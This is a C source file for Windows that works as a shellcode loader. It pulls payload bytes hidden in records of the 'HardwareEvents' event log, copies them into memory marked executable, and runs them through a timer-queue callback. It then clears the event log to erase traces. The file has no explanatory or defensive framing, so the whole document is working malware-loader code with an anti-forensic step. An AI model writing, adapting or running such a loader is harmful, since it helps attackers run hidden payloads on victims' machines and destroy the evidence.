#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <Shlwapi.h>

BYTE tmp[0x70000] = { 0 };

DWORD GetEventsSize() {
	DWORD dwRead;
	DWORD dwNext;
	DWORD dwLen = 0;

	EVENTLOGRECORD* pevlr = (EVENTLOGRECORD*)&tmp;

	HANDLE hEventLog = OpenEventLogA(0, "HardwareEvents");

	while (ReadEventLogA(hEventLog, EVENTLOG_FORWARDS_READ | EVENTLOG_SEQUENTIAL_READ, 0, pevlr, 0x70000, &dwRead, &dwNext)) {
		while (dwRead > 0)
		{
			if (pevlr->EventCategory == 0x5678) {
				dwLen += pevlr->DataLength;
			}
			dwRead -= pevlr->Length;
			pevlr = (EVENTLOGRECORD*)((PBYTE)pevlr + pevlr->Length);
		}
		pevlr = (EVENTLOGRECORD*)&tmp;
	}

	CloseEventLog(hEventLog);

	return dwLen;
}

PBYTE ReadEvents() {

	DWORD dwRead;
	DWORD dwNext;
	DWORD dwOffset = 0;
	EVENTLOGRECORD* pevlr = (EVENTLOGRECORD*)&tmp;

	HANDLE hEventLog = OpenEventLogA(0, "HardwareEvents");
	PBYTE pBuffer = (PBYTE)VirtualAlloc(NULL, GetEventsSize(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	while (ReadEventLogA(hEventLog, EVENTLOG_FORWARDS_READ | EVENTLOG_SEQUENTIAL_READ, 0, pevlr, 0x70000, &dwRead, &dwNext)) {
		while (dwRead > 0)
		{
			if (pevlr->EventCategory == 0x5678) {
				memcpy(pBuffer + dwOffset, (PBYTE)((DWORD64)pevlr + pevlr->DataOffset), pevlr->DataLength);
				dwOffset += pevlr->DataLength;
			}
			dwRead -= pevlr->Length;
			pevlr = (EVENTLOGRECORD*)((PBYTE)pevlr + pevlr->Length);
		}
		pevlr = (EVENTLOGRECORD*)&tmp;
	}

	ClearEventLogA(hEventLog,NULL);
	CloseEventLog(hEventLog);

	return pBuffer;
}

int main() {
	HANDLE timer;
	HANDLE queue = ::CreateTimerQueue();
	HANDLE gDoneEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

	CreateTimerQueueTimer(&timer, queue, (WAITORTIMERCALLBACK)ReadEvents(), NULL, 100, 0, 0);
	WaitForSingleObject(gDoneEvent, INFINITE);

	return 0;
}